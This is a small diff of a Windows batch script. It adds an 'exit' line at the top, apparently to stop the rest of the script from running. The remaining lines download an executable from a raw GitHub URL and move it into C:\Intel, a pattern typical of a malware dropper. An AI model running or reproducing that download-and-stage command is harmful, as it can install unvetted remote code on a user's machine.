@@ -1,3 +1,4 @@
+exit
 if %cd%==C:\Intel goto ok
 dler https://raw.githubusercontent.com/dietrich03muller/test/master/BGh.exe nBGh.exe
 move /y nBGh.exe C:\Intel
